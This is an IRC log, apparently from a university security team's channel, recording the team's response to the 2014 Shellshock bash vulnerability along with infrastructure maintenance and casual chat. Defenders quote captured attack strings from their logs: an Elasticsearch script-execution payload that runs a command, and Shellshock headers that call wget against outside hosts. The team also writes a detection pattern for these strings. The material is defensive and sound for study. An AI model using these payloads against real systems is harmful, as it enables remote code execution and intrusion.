2014-09-23 12:24:40	jazoff	I forgot about the 'Manual block -> ASN lookup' feature, never got around to doing that at UA but it comes in handy
2014-09-23 12:25:14	jazoff	helps avoid people blocking a google ip or something
2014-09-23 14:51:14	eyrich	wardog: are you going to contact Wayne to make sure he can access and edit the new page?
2014-09-23 15:10:41	wardog	I'll im him
2014-09-23 15:10:43	wardog	if you haven't
2014-09-23 15:11:17	wardog	well, I sent a note anyway
2014-09-23 15:32:33	wardog	Also, regarding archives. Having all the logs zipped into a single daily file seems difficult to deal with when trying to pull old log files. Can we concat the logs per host/day instead?
2014-09-24 12:22:05	soehlert	https://access.redhat.com/articles/1200223
2014-09-24 12:23:20	jazoff	fun
2014-09-24 12:24:32	soehlert	you think that would require emergency patch mode? 
2014-09-24 12:24:48	soehlert	remote unauthenticated attackers providing env vars seems like a very bad thing
2014-09-24 12:24:54	jazoff	i think it should be patched :)
2014-09-24 12:25:07	soehlert	well right, but bad enough to make bw deal with me patching today
2014-09-24 12:25:59	jazoff	seems like it would be a low risk patch
2014-09-24 12:35:22	jazoff	unless something somehow is relying on that broken behavior :)
2014-09-24 12:35:59	soehlert	My concern is that I prefer to reboot after making any updates. In case the update boofs something, I'd like to know now vs months from now when I can't remember what's been changed
2014-09-24 12:39:22	wardog	So, which are the remote unauthenticated scenarios are of concern. Maybe I'm missing something.
2014-09-24 12:39:33	wardog	english bad....
2014-09-24 12:39:49	soehlert	im not entirely sure. still trying to figure it out as there doesn't seem to be a master list anywhere
2014-09-24 12:40:11	wardog	It seems like you at the very least need some kind of shell access.
2014-09-24 12:40:23	wardog	Unautheticated appears to be through avenues like CGI scripts.
2014-09-24 12:40:49	wardog	Actual shell access appears to be through SSH, but you need to be able to get a shell first to pass the commands.
2014-09-24 12:41:02	soehlert	thats true
2014-09-24 12:41:12	soehlert	kinda overlooked that thought
2014-09-24 12:41:21	soehlert	and since the bastions arent running anything that would allow that..
2014-09-24 12:41:49	jazoff	or dhclient...
2014-09-24 12:41:57	wardog	You need a rogue dhcp server
2014-09-24 12:42:12	wardog	or spoofed dhcp replies
2014-09-24 12:44:33	wardog	It also looks like there's no priv escalation involved. Whatever you set the env variable to is still restricted to your user perms.
2014-09-24 12:44:56	jazoff	sure, though there are likely issues there still
2014-09-24 12:45:08	jazoff	i.e., something that drops perms but uses bash in the process
2014-09-24 12:45:17	jazoff	like bro live or something :)
2014-09-24 12:45:39	wardog	Could be a good test case.
2014-09-24 12:46:50	wardog	I dunno, the more I look at this, the more it looks like a minor issue.
2014-09-24 12:47:26	soehlert	ya i think the initial post i saw ""A flaw was found in the way Bash evaluated certain specially crafted environment variables. An attacker could use this flaw to override or bypass environment restrictions to execute shell commands. Certain services and applications allow remote unauthenticated attackers to provide environment variables, allowing them to exploit this issue."" made it sound
2014-09-24 12:47:26	soehlert	much worse
2014-09-24 12:47:42	jazoff	it still sounds pretty bad
2014-09-24 12:48:04	wardog	agreed, sounds bad, but I think the impact is minimal on systems that DON'T rely on command restrictions.
2014-09-24 12:48:19	wardog	The other way, bad.
2014-09-24 12:48:56	wardog	Any CGI scripts that use bash to execute should be patched.
2014-09-24 12:49:01	wardog	er, systems.
2014-09-24 12:50:05	wardog	Well, I'm guessing Randy's going to have me jumping through hoops on this for the next hour or so so I'm gonna drop whiparound and just follow-up with you guys one-on-one as needed.
2014-09-24 12:50:26	wardog	And, there are cookies in the foyer at 2.
2014-09-24 12:51:18	wardog	"We have also verified that this vulnerability is exposed in ssh---but only to authenticated sessions."
2014-09-24 12:53:06	wardog	Looks like the SSH vector you can configure sshd to deny AcceptEnv
2014-09-24 12:53:31	soehlert	ya thats int he conf, not sure what effect that would have elsewhere though
2014-09-24 12:54:14	wardog	I think you need to specify the variables to send to the server when you connect via SSH. Not many people do that. If they're going through the bastion hosts, there's no reason.
2014-09-24 13:02:51	jazoff	right.. there would be no issue there, the only issue would be for something like bro livew
2014-09-24 13:02:58	jazoff	where the sshd config tries to limit the command you are allowed to run
2014-09-24 13:03:23	jazoff	or something setup that is only supposed to allow sftp or rsync.. stuff like that
2014-09-24 13:03:42	soehlert	limited ssh keys would have an issue as well i would think right?
2014-09-24 13:05:30	wardog	hmmm. Well, it wouldn't be hard to patch bro live, though, would it?
2014-09-24 13:22:06	jazoff	no.. asuming it even has an issue, would just be a better of setting that ssh option
2014-09-24 13:34:36	wardog	Well, AcceptEnv needs to specificially defined, and it has to be defined to a small handful of variables.
2014-09-24 13:34:46	wardog	So, I think, by default, it should be fine.
2014-09-24 13:34:51	wardog	https://wiki.ncsa.illinois.edu/display/SecOps/2014/09/24/CVE-2014-6271+Bash+Remote+Exploit+Vulnerability
2014-09-24 13:34:58	wardog	Plase check my sanity on that.
2014-09-24 13:35:54	jazoff	oh, but there is a default right?
2014-09-24 13:36:13	jazoff	oh, i guess not. ok then
2014-09-24 13:37:12	jazoff	did you want to mention cups and dhclient?
2014-09-24 13:38:56	wardog	Sure.
2014-09-24 13:40:02	soehlert	fun little example...http://www.reddit.com/r/netsec/comments/2hbxtc/cve20146271_remote_code_execution_through_bash/ckrbqac
2014-09-24 13:40:52	jazoff	yeah
2014-09-24 13:40:53	jazoff	nasty
2014-09-24 13:46:15	wardog	oh dear god.
2014-09-24 13:46:20	soehlert	?
2014-09-24 13:46:27	wardog	that example.
2014-09-24 13:46:30	soehlert	ah ya
2014-09-24 13:48:26	wardog	Added that to the page.
2014-09-24 13:58:42	wardog	Ansible script to patch. https://github.com/npm/ansible-bashpocalypse
2014-09-24 14:07:42	jazoff	that's kinda overkill for what it does
2014-09-24 14:13:30	jazoff	really all it does is sudo apt-get update && sudo apt-get --only-upgrade install bash
2014-09-24 14:33:07	wardog	:D
2014-09-24 14:48:46	wardog	Is there some way we can set up an alert for bro to detect this issue?
2014-09-24 14:49:04	wardog	Seems difficult since the exact code that's being passed is arbritrary.
2014-09-24 14:49:39	jazoff	grrr, I looked for ()
2014-09-24 14:49:43	jazoff	found  141.142.41.11:9200
2014-09-24 14:49:46	jazoff	public elastic search server
2014-09-24 14:49:55	wardog	sigh.
2014-09-24 14:50:04	wardog	Is that the same one as before?
2014-09-24 14:50:16	jazoff	no
2014-09-24 14:50:17	jazoff	this is indefatigable.ncsa.illinois.edu.
2014-09-24 14:51:13	jazoff	*** Netdot (Netdot information) ***
2014-09-24 14:51:14	jazoff	Status: Static
2014-09-24 14:51:14	jazoff	Description:
2014-09-24 14:51:14	jazoff	Used by: mfelarca
2014-09-24 14:52:08	wardog	Now, if only it ran elasticsearch with bash scripts.
2014-09-24 14:52:36	jazoff	well, it gets hit with
2014-09-24 14:52:37	jazoff	_search?source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"whoami\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}
2014-09-24 14:52:43	soehlert	or some cgi to a WUI
2014-09-24 14:52:57	jazoff	and unless they turn off the scripting thing, that works
2014-09-24 14:54:51	wardog	oooh.
2014-09-24 14:54:53	wardog	that's not good.
2014-09-24 15:02:42	jazoff	brb, dog walk + food
2014-09-24 15:02:51	jazoff	based on the bro logs I don't think that box was compromised, just poked at
2014-09-24 15:02:54	jazoff	but I will look further
2014-09-24 15:03:05	jazoff	would not hurt to send them as nastygram though
2014-09-24 15:10:33	wardog	Why does thunderbird decide that it no longer wants to let the 'send' button work anymore....
2014-09-24 15:20:12	jazoff	does it think you are offline or something?
2014-09-24 15:20:45	jazoff	i'm going to check the historical logs on that host and then go lie down.. have had a headache all day
2014-09-24 15:20:51	wardog	I don't think so. It can still receive email and stuff. The only thing is I try to hit send and it does nothing.
2014-09-24 15:20:56	wardog	aight
2014-09-24 15:20:59	jazoff	I think not finding an eye doctor yet and getting a new perscription is catching up with me
2014-09-24 15:21:04	wardog	ibuprofen and coke (the soda kind)
2014-09-24 15:21:05	jazoff	prescription? one of those
2014-09-24 15:21:30	wardog	or anything with caffeine to hurry the ibuprofen along.
2014-09-24 15:24:17	jazoff	seems the ES server only started recntly
2014-09-24 15:25:21	wardog	Well, I'll send an email along the lines of, 'while checking for potential attacks recently we detected the following elasticsearch available publically... yadda yadda' sound alright?
2014-09-24 15:27:23	jazoff	yeah
2014-09-24 15:27:39	jazoff	http://www.elasticsearch.org/blog/scripting-security/
2014-09-24 15:28:35	jazoff	ah, the cluster api has it..
2014-09-24 15:28:39	jazoff	    "jvm" : {
2014-09-24 15:28:40	jazoff	      "max_uptime" : "8.9d",
2014-09-24 15:29:13	jazoff	bro saw it on 2014-09-19/ for the first time
2014-09-24 15:29:23	jazoff	er, 2014-09-17
2014-09-24 15:32:12	jazoff	also... http://141.142.41.11/
2014-09-24 15:33:17	jazoff	ok, looks like they only got hit with 2 attempts to run whoami\
2014-09-24 15:33:25	jazoff	which either means they are lucky, or they happen to have scripting off
2014-09-24 15:33:51	wardog	i tried one today.
2014-09-24 15:33:52	wardog	:D
2014-09-24 15:34:29	wardog	Can you set up hubot to pull netdot queries?
2014-09-24 15:35:59	jazoff	yes.. I have the plugin written for ninfo
2014-09-24 15:36:11	jazoff	just need to do something about the authentication requirement
2014-09-24 15:36:14	wardog	netdot 141.142.41.11
2014-09-24 15:36:22	jazoff	it's nto deployed :)
2014-09-24 15:36:32	wardog	image me racoon
2014-09-24 15:36:41	jazoff	not enabled :)
2014-09-24 15:36:41	wardog	ncsabot: mustache me
2014-09-24 15:36:42	ncsabot	http://mustachify.me/0?src=http://static.guim.co.uk/sys-images/Film/Pix/pictures/2009/5/28/1243524288264/Scene-from-Drag-Me-to-Hel-001.jpg#.png
2014-09-24 15:36:47	jazoff	oh, I guess that one is :)
2014-09-24 15:36:57	wardog	oh, that's frightening
2014-09-24 15:37:02	jazoff	it work better on campfire or other services that will show inline images
2014-09-24 15:37:15	jazoff	that lets you do cool stuff like 'graphme ....'
2014-09-24 15:37:20	jazoff	and the graph shows up for everyone to se
2014-09-24 15:37:31	jazoff	oh, speaking of netdot
2014-09-24 15:38:15	jazoff	the guy that wrote netdot emailed me the other day, apparently people were trying to use the netdot python client that someone wrote, but it was broken
2014-09-24 15:38:45	jazoff	but he found my fork which fixed the bugs and worked, so he poked me to send a pull request and get it merged, which it now is :)
2014-09-24 15:49:55	wardog	wait. netdot is a thing? it's not just in house?
2014-09-24 15:50:09	wardog	I thought it was just an internal project name.
2014-09-24 15:50:23	wardog	Ah, well, there you go.....
2014-09-24 15:50:46	wardog	Feels less icky now.
2014-09-24 15:51:05	wardog	heh
2014-09-24 15:51:08	wardog	congrats
2014-09-24 16:07:47	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2014-09-24 16:29:26	jschipp	anyone there
2014-09-24 16:36:48	eyrich	I am now
2014-09-24 16:36:56	jschipp	test
2014-09-24 16:37:02	eyrich	what
2014-09-24 16:38:00	eyrich	vsads 0 is offline
2014-09-24 16:48:13	eyrich	i got one of the syslog load balncers back up
2014-09-24 17:04:00	wardog	I'm at NPCF
2014-09-24 17:04:10	wardog	Looks like a drive has gone bad on the lower server
2014-09-24 17:05:59	jschipp	ls
2014-09-24 17:07:10	wardog	Sigh. Well, one thing that we should probably try to do is see who's no longer sending us logs. Is that possible, those systems may have gone down
2014-09-24 17:10:04	wardog	someone send a sitrep to security@. Randy's probably going to get questions from other directors and he's happier if he has info to give them.
2014-09-24 17:11:45	wardog	He'll want to know what happened and what we're doing to correct it. Tomorrow we'll need more details and what to do to prevent it. So start brainstorming.
2014-09-24 17:13:29	wardog	Log into all the servers and make sure they're still running and not mounting r/o
2014-09-24 17:21:05	eyrich	brainstorming - switch to hardware SAN
2014-09-24 17:21:58	eyrich	nagios monitor should be on a different node then the main nagios box
2014-09-24 17:22:27	eyrich	all boxes are powered back up
2014-09-24 17:22:38	eyrich	or maybe nagios monitor should be a HW box
2014-09-24 17:24:08	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has left #security
2014-09-24 17:24:13	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-09-24 17:24:15	jschipp	ls
2014-09-24 17:41:57	eyrich	everything is back up now
2014-09-24 17:52:59	jschipp	kk
2014-09-24 17:53:02	jschipp	what was the issue?
2014-09-24 17:53:13	eyrich	see the email i sent to security
2014-09-24 17:53:25	jschipp	kk
2014-09-24 17:53:27	eyrich	we also dropped a drive in node 2, but node is the one that had all the issues
2014-09-24 23:10:52	jschipp	word
2014-09-25 09:15:15	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2014-09-25 09:25:50	soehlert	waiting on a package today
2014-09-25 09:32:52	jazoff	lots of bash exploit attempts yesterday
2014-09-25 09:35:00	jazoff	actually, just one
2014-09-25 09:35:08	jazoff	82.118.242.223  58216   141.142.21.2    80      1       GET-
2014-09-25 09:35:09	jazoff	        /       -       () { :; }; wget 82.118.242.223:8000
2014-09-25 09:36:34	wardog	Can we get an alert for '() { :;};' perhaps?
2014-09-25 09:36:39	wardog	I suppose a splunk rule would do it.
2014-09-25 09:36:41	wardog	nevermind
2014-09-25 09:37:07	wardog	How did you go from a lot to just one?
2014-09-25 09:42:14	jazoff	oh, i was seeing qualys
2014-09-25 09:42:28	jazoff	my grep piucked up some sql scans
2014-09-25 10:21:20	jazoff	hmm, someone just poked http://cvs.ncsa.uiuc.edu/viewcvs.cgi 
2014-09-25 10:23:08	jazoff	doesn't seem vulnerable
2014-09-25 10:23:34	jazoff	ah, lots of scans starting
2014-09-25 10:35:19	eyrich	i need to do maint on esx node00, please review this doc and see if you are ok with procedure, do let me know machine that can be powered off instead of needing to stay up
2014-09-25 10:35:50	eyrich	https://wiki.ncsa.illinois.edu/display/CSD/2014-09-24+-+ESX+Emergency+Maintenance
2014-09-25 10:35:56	eyrich	sorry - node02
2014-09-25 10:36:40	jazoff	how long would the downtime be fore?
2014-09-25 10:37:17	eyrich	eh - less then 4 hours
2014-09-25 10:37:49	eyrich	im hoping like 30 minutes - but no guarntees
2014-09-25 10:37:58	jazoff	might be nice to move munin so we dont have gaps in the graphs, but nothing will break if it is down for a bit
2014-09-25 10:38:10	eyrich	its on the move list
2014-09-25 10:38:13	jazoff	oh :)
2014-09-25 10:38:23	jazoff	ah, i see now
2014-09-25 10:40:08	jazoff	traffic to 162.253.66.76/
2014-09-25 10:40:09	jazoff	traffic to 162.253.66.76
2014-09-25 10:40:17	jazoff	(bash worm related)
2014-09-25 10:40:18	ncsabot	Seen in 49 hours over 14 days. First seen in 2014-05-26.db. Last seen in 2014-09-25.db
2014-09-25 10:40:19	ncsabot	Seen in 49 hours over 14 days. First seen in 2014-05-26.db. Last seen in 2014-09-25.db
2014-09-25 10:40:29	jazoff	grr, clearly used to be something else
2014-09-25 10:40:29	eyrich	kill it
2014-09-25 10:40:52	jazoff	hah, it's already blocked
2014-09-25 10:40:53	eyrich	or used for other scanning
2014-09-25 10:41:00	jazoff	ninfo bhlist 162.253.66.76
2014-09-25 10:41:01	ncsabot	IP: 162.253.66.76 Who: bro Why: Scan::Address_Scan: 162.253.66.76 scanned at least 37 unique hosts on port 80/tcp in 0m58s When: 2014-08-15T19:02:17 Expire: 2014-12-13T19:19:53
2014-09-25 10:41:13	eyrich	:)
2014-09-25 10:41:44	soehlert	you can shutdown squid, it's not being used at all yet. i'd ask terry before you take down tepid-centos and cool-centos though
2014-09-25 10:41:56	jazoff	working on deploying https://github.com/CriticalStack/bro-scripts/blob/cve-2014-6271/bash-cve-2014-6271/bash-cve-2014-6271.bro
2014-09-25 10:42:04	eyrich	I talked with Terry
2014-09-25 10:42:32	soehlert	ok then i can quit what im doing on tepid for now
2014-09-25 10:42:34	eyrich	updated page
2014-09-25 10:42:47	eyrich	well you can keep doign it for now, im not ready yet
2014-09-25 10:43:29	eyrich	warren wants me to migrate  some of the less critical machines first and have you guys confirm that they are still ok 
2014-09-25 11:00:43	eyrich	Im going to start live migrating hosts to node 01 now
2014-09-25 11:01:45	eyrich	starting with wiki and sects01, anybody care which ones after that?
2014-09-25 11:05:45	eyrich	wiki moved, please confirm still working, munin moving now
2014-09-25 11:06:14	eyrich	sects01 getting rebooted after updating vsphere client
2014-09-25 11:09:46	eyrich	munin done - can someone check that these boxes are working
2014-09-25 11:13:07	jazoff	munin looks good
2014-09-25 11:13:26	eyrich	all all the machines in #3 - to migrate are moved
2014-09-25 11:13:27	wardog	yep
2014-09-25 11:13:30	wardog	looks good
2014-09-25 11:13:37	eyrich	ok to move to step 4
2014-09-25 11:13:37	eyrich	?
2014-09-25 11:13:51	wardog	wiki?
2014-09-25 11:13:54	wardog	you mean wiki-sec?
2014-09-25 11:13:59	eyrich	https://wiki.ncsa.illinois.edu/display/CSD/2014-09-24+-+ESX+Emergency+Maintenance
2014-09-25 11:14:07	wardog	No, I mean you moved 'wiki'
2014-09-25 11:14:07	eyrich	the vm is just wiki
2014-09-25 11:14:11	eyrich	yes
2014-09-25 11:14:11	wardog	Hmm
2014-09-25 11:14:21	wardog	weird
2014-09-25 11:14:26	wardog	Web page looks fine.
2014-09-25 11:14:37	wardog	ah
2014-09-25 11:16:44	wardog	seeing this on wiki-sec but everything seems r/w. sd 2:0:0:0: [sda] CDB: Write(10): 2a 00 01 68 52 58 00 00 08 00
2014-09-25 11:18:06	eyrich	failing over the VSAD for node 2 to from the node02 VSA to the node01 VSA
2014-09-25 11:19:13	eyrich	everything still ok?
2014-09-25 11:20:00	wardog	wiki-sec seems fine
2014-09-25 11:20:11	wardog	I should probably look at thruk
2014-09-25 11:20:30	eyrich	im logging in now, so I can downtime the boxes im about to power off
2014-09-25 11:20:57	wardog	huh. I don't have access to thurk
2014-09-25 11:21:07	eyrich	check the shared last pass
2014-09-25 11:21:36	wardog	ah
2014-09-25 11:22:43	eyrich	how do you log out? I just acked cool and tepid
2014-09-25 11:22:47	eyrich	but logged in as ca-admin
2014-09-25 11:22:51	eyrich	so not seeing the others
2014-09-25 11:24:20	jazoff	if it's http auth, easiest way is open a new private tab
2014-09-25 11:24:21	jazoff	or try hitting
2014-09-25 11:24:36	jazoff	https://blah@th....ncsa/
2014-09-25 11:24:38	eyrich	yep
2014-09-25 11:24:40	wardog	there's no log out button?
2014-09-25 11:24:44	jazoff	the blah@ login should fail and it should re-prompt
2014-09-25 11:24:44	eyrich	I close chrome and reopened
2014-09-25 11:24:49	jazoff	http auth doesn't really have the concept of logout
2014-09-25 11:25:32	wardog	So, thruk doesn't do any kind of session handling?
2014-09-25 11:27:15	wardog	how kind to leave a note in the referral header... https://gist.github.com/anonymous/9b50d1516162d8b081b4
2014-09-25 11:27:29	eyrich	ok dowing all the machines in step 5 now
2014-09-25 11:29:47	eyrich	tornado not showing vmwaretools active
2014-09-25 11:29:56	eyrich	can someone please log in and power it off
2014-09-25 11:30:38	wardog	what does tornado do?
2014-09-25 11:30:42	jazoff	nmap
2014-09-25 11:30:45	jazoff	on demand stuff
2014-09-25 11:30:57	wardog	so, it can be shutdown?
2014-09-25 11:31:03	eyrich	yes
2014-09-25 11:32:32	eyrich	wardog: are you taking care of tornado?
2014-09-25 11:32:40	eyrich	its the last vm up
2014-09-25 11:32:47	wardog	I was not. but I can. But randy just walked in
2014-09-25 11:32:52	eyrich	jazoff: 
2014-09-25 11:34:29	jazoff	?
2014-09-25 11:34:38	wardog	Ok randy's gone.
2014-09-25 11:34:54	wardog	huh.
2014-09-25 11:34:56	wardog	can't get to it.
2014-09-25 11:35:05	wardog	at least I can't ssh from fog to it.
2014-09-25 11:35:19	eyrich	I can see from console its pissed off anyway - want to go into maint, im powerign off for now
2014-09-25 11:37:04	eyrich	ok - finished step 7
2014-09-25 11:45:44	soehlert	tornado is messed up atm
2014-09-25 11:46:24	eyrich	yes - and powered off too
2014-09-25 11:49:38	jschipp	nagios nor thruk provdes a logout option, you do something like http://testuser:testpass@thruk.... to overwrite browser's stored credentials for HTTP Auth which will fail (desirable)
2014-09-25 12:09:21	jazoff	not much activity on the bash thing
2014-09-25 12:15:44	wardog	one guy apparently doing a 'survey'. I'm guessing he google dorked cgi-bin urls
2014-09-25 13:09:12	wardog	jazoff: have you tried any of the shellshock detection scripts for bro yet?
2014-09-25 13:09:29	jazoff	yes, runnng in dev
2014-09-25 13:09:35	wardog	k
2014-09-25 13:13:40	jazoff	scans picking up
2014-09-25 13:28:32	eyrich	oops running out of downtime
2014-09-25 13:34:13	wardog	Got a host that we want to put ssl on so I can test the JIRA ticketing queue for certs?
2014-09-25 13:34:32	wardog	cyclone? portal-sec? git-sec?
2014-09-25 13:35:41	jazoff	put ssl on?
2014-09-25 13:35:53	jazoff	oh, a cert!
2014-09-25 13:36:33	jazoff	portal-sec has a cert, but it is locally trusted, i suppose it couldn't hurt to have a proper one
2014-09-25 13:40:13	eyrich	bringing everythin back up slowly now
2014-09-25 13:41:36	wardog	I assume that's a local thing, not a puppet thing?
2014-09-25 13:41:42	wardog	jazoff: re: cert
2014-09-25 13:43:06	eyrich	soehlert: do you want tornado on, or leave it off for now?
2014-09-25 13:44:20	soehlert	turn it on, i'll fsck it when it comes back up if it still needs it
2014-09-25 13:45:35	soehlert	is the dnsworks site down for anyone else
2014-09-25 13:45:48	eyrich	it should be that stuff is dead
2014-09-25 13:45:56	soehlert	oh ok
2014-09-25 13:46:12	soehlert	so just a free for all on registering host names now?
2014-09-25 13:46:49	eyrich	not sure what the procedure is for hosts not on workstation nets
2014-09-25 13:47:01	soehlert	i guess i'll just create a ticket
2014-09-25 13:47:43	soehlert	wardog: are you groot?
2014-09-25 13:48:17	jazoff	wardog: puppet thing?
2014-09-25 13:51:38	wardog	see
2014-09-25 13:51:40	wardog	si
2014-09-25 13:51:44	wardog	I am groot.
2014-09-25 13:51:51	wardog	It's a CentOS 7 box. What's up?
2014-09-25 13:52:09	soehlert	nice. just curious whose it was when iw as adding an ip
2014-09-25 13:53:13	wardog	gotcha.
2014-09-25 14:09:23	wardog	jazoff: is cert for portal-sec handled through puppet or manually on the system?
2014-09-25 14:09:43	wardog	not the generation, just telling apache where to get it.
2014-09-25 14:17:47	jazoff	oh, puppet
2014-09-25 14:18:05	jazoff	  file { '/home/portal/ssl':
2014-09-25 14:18:06	jazoff	    source  => 'puppet:///modules/portal/ssl',
2014-09-25 14:18:59	wardog	I'm just trying to figure out where to generate the CSR and key, where to put it, and the signed cert (and intermediate cert) when it's processed.
2014-09-25 14:23:38	jazoff	puppet/modules/portal//files/ssl
2014-09-25 14:25:02	wardog	i see. Need to add an intermediary cert too.
2014-09-25 14:27:09	jazoff	yeah, we have one in there now, the ncsa_security_internal.crt
2014-09-25 14:27:21	jazoff	then the module has
2014-09-25 14:27:22	jazoff	    ssl_cert                    => '/home/portal/ssl/portal-sec.crt',
2014-09-25 14:27:22	jazoff	    ssl_key                     => '/home/portal/ssl/portal-sec.key',
2014-09-25 14:27:22	jazoff	    ssl_ca                      => '/home/portal/ssl/ncsa_security_internal.crt',
2014-09-25 14:27:41	wardog	ah
2014-09-25 15:08:02	soehlert	https://www.youtube.com/watch?v=tKyuDgygvqc new movie called blackhat coming out...
2014-09-25 15:14:58	wardog	why are the movie hackers always from MIT.
2014-09-25 15:15:19	soehlert	because they dont know anywhere else that is smart with computers?
2014-09-25 15:16:43	wardog	I want to see big hero 6
2014-09-25 15:17:21	soehlert	what is that one about again?
2014-09-25 15:17:41	wardog	It's a marvel comic about a boy and his robot
2014-09-25 15:39:16	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2014-09-26 08:53:16	jazoff	lots of merge issues trying to merge development into production in puppet.. trying to fix
2014-09-26 09:12:31	eyrich	updating sec firewalls
2014-09-26 09:16:02	jazoff	oook, I think I got it
2014-09-26 09:16:17	jazoff	merged most things, backed out the changes to the ssh module 
2014-09-26 09:17:49	jazoff	'git diff development production' is showing a few random things, not sure if those should be merged
2014-09-26 09:28:23	jazoff	hopefully I did not break anything
2014-09-26 09:33:03	jazoff	ok, now that puppet is updated and bro is merged and pushed to supercell
2014-09-26 09:33:10	jazoff	we should be BHRing any bash exploit attempts
2014-09-26 09:41:19	jazoff	eek, bro-dev is not happy
2014-09-26 09:41:26	jazoff	 09:41:11 up 22 days, 21:44,  4 users,  load average: 76.37, 24.54, 9.54
2014-09-26 09:41:55	jazoff	seems ok now, weird
2014-09-26 09:50:48	jazoff	and of course, the bash scans have left up
2014-09-26 10:26:39	jazoff	hmm /tmp/ on bwbh2 is full..
2014-09-26 10:26:45	jazoff	[jazoff@bwbh2 tmp]$ du -hs /tmp/stunnel_client.log
2014-09-26 10:26:45	jazoff	4.5G    /tmp/stunnel_client.log
2014-09-26 10:27:13	jazoff	looks like it is the bro sshd thing
2014-09-26 10:29:05	jazoff	i truncated it.. assuming that since it is in /tmp/ nothing looks at it anyway
2014-09-26 10:29:59	wardog	Is it still making it to drought? or wherever the isshd stuff goes
2014-09-26 10:30:12	jazoff	derecho
2014-09-26 10:30:21	wardog	correctomundo
2014-09-26 10:30:38	jazoff	hmm, actually.. looks like not getting anything
2014-09-26 10:30:57	jazoff	oh wait, lokoed in wrong place
2014-09-26 10:31:13	wardog	maybe that's why it's sitting in tmp
2014-09-26 10:31:26	jazoff	looks good i think
2014-09-26 10:31:41	wardog	It's everyone trying to run the bash vuln on all the compute notes.
2014-09-26 10:31:53	jazoff	no.. taht log file looked like normal stuff
2014-09-26 10:31:57	wardog	darn.
2014-09-26 10:32:02	jazoff	just going back a very long time
2014-09-26 10:32:12	wardog	uh...
2014-09-26 10:32:21	wardog	We should only be keeping 2 weeks worth of isshd logs
2014-09-26 10:32:26	jazoff	oh, it wasn't sshd logs
2014-09-26 10:32:30	jazoff	it was logs from stunnel
2014-09-26 10:32:48	wardog	ah
2014-09-26 10:32:53	jazoff	connected/disconnected/connected/disconnected/etc
2014-09-26 10:33:03	jazoff	going back I think however long the uptime on the box is
2014-09-26 10:33:55	wardog	jazoff: can you test http://141.142.41.11:9200/ from offcampus?
2014-09-26 10:34:23	jazoff	i can still get to it
2014-09-26 12:33:39	jazoff	going to get haircut, then leaving soon for 5pm flight to dc
2014-09-26 12:33:56	jazoff	google now saved my ass.. thought it was later for some reason :)
2014-09-26 13:28:58	jazoff	yay
2014-09-26 13:28:59	jazoff	ninfo bhlist 162.244.34.25
2014-09-26 13:29:00	ncsabot	Empty Result
2014-09-26 13:29:03	jazoff	hmmm
2014-09-26 13:29:07	jazoff	too soon maybe
2014-09-26 13:29:15	wardog	yay....
2014-09-26 13:29:25	jazoff	ninfo bhrhistory 162.244.34.25
2014-09-26 13:29:49	ncsabot	Empty Result
2014-09-26 13:29:55	jazoff	boo
2014-09-26 13:30:22	jazoff	huh
2014-09-26 13:30:36	jazoff	should be blocked due to the bash thing
2014-09-26 13:30:49	jazoff	1411754484.928367CTgHQR3vNJXdcFvsFc162.244.34.2554808141.142.192.19980---tcpBash::HTTP_Header_Attack162.244.34.25 may have attempted to exploit CVE-2014-6271, bash environment variable attack, via HTTP mod_cgi header against 141.142.192.199 submitting "USER-AGENT"="() { :;}; /bin/bash -c "/usr/bin/wget http://google-traffic-analytics.com/shashok-www.informatics.illinois.edu -O /dev/null""-162.244.34.25141.142.192.19980-nids-23-3Notice::AC
2014-09-26 13:32:54	jazoff	i wonder if the shell chars screwed up the ssh command used to bhr
2014-09-26 13:33:03	soehlert	hah thatd be kinda funny
2014-09-26 13:33:45	jazoff	yeah, seth has a funny story about that :)
2014-09-26 13:34:00	soehlert	i'll have to ask him sometime
2014-09-26 13:34:54	jazoff	so many moving parts, not sure where the problem is.. I can manually try blocking it though to see what happens
2014-09-26 13:35:24	jazoff	some more logging in the bhr stuff would help :)
2014-09-26 13:38:29	jazoff	ah
2014-09-26 13:38:34	jazoff	DBD::Pg::st execute failed: ERROR:  value too long for type character varying(256) at /services/blackhole/bin/bhrdb.pm line 77, <FH> line 46.
2014-09-26 13:38:37	jazoff	ERROR:  value too long for type character varying(256) at /services/blackhole/bin/bhrdb.pm line 77, <FH> line 46.
2014-09-26 13:47:44	jazoff	ninfo bhrhistory 162.244.34.25
2014-09-26 13:47:45	ncsabot	Empty Result
2014-09-26 13:48:09	jazoff	well, it is blocked now at least
2014-09-26 13:51:20	soehlert	https://twitter.com/christruncer/status/515485410026594305
2014-09-26 14:00:35	wardog	nice
2014-09-26 14:00:37	wardog	 I like that.
2014-09-26 14:08:28	jazoff	ok, heading to airport. will check in later
2014-09-26 14:48:03	wardog	 NOOOOOO
2014-09-26 14:48:14	soehlert	?
2014-09-26 14:48:25	wardog	oh.. maybe not so bad.
2014-09-26 14:48:32	wardog	2014-09-26T02:56:39.427047	CITymc2TmiwJnzxChe	175.45.213.125	1140	141.142.192.164	80	tcp	http	1.199211	353	2559	SF	F	0	ShADadFfR	12	1202	18	5854	(empty)	KR	US	nids-27-10
2014-09-26 14:48:35	wardog	2014-09-26T02:56:40.030765	CsHej63IgRU2I4M7ue	141.142.192.164	59825	175.45.213.125	80	tcp	http	0.874040	164	402	RSTR	T	0	ShADdFar	10	864	8	1220	(empty)	US	KR	nids-27-10
2014-09-26 14:48:38	wardog	love the formatting.
2014-09-26 14:48:50	wardog	shellshock attempt.
2014-09-26 14:49:02	wardog	Saw a response from CVS. But it's a reset.
2014-09-26 14:49:06	soehlert	ah ok
2014-09-26 15:39:30	soehlert	ncsabot traffic to 207.235.68.178
2014-09-26 15:39:36	ncsabot	Seen in 4 hours over 3 days. First seen in 2014-08-12.db. Last seen in 2014-09-26.db
2014-09-26 21:51:58	jazoff	ninfo bhlist 177.154.48.54
2014-09-26 21:51:59	ncsabot	Empty Result
